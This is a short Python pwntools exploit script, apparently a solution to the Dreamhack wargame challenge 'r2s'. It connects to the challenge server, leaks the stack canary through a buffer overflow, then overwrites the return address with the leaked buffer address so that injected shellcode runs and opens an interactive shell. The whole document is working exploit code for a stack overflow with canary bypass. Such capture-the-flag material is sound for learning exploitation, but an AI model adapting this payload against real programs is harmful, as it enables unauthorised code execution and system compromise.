from pwn import *

#p = process("./r2s")

p = remote("host3.dreamhack.games",22709)

e = ELF("./r2s")

context.arch = 'amd64'
sh = asm(shellcraft.sh())

p.recvuntil(b"buf: ")
buf = int(p.recvline()[:-1], 16)

#canary leak
payload = b"a" * (0x60 - 0x8)
payload += b"a"


p.sendafter(b"Input: ", payload)
p.recvuntil(payload)
cnry = u64(b"\x00" + p.recvn(7))

payload = sh.ljust((0x60 - 0x8),b'a')
payload += p64(cnry)
payload += b"a" * 8
payload += p64(buf)

p.sendafter(b'Input: ',payload)

p.interactive()
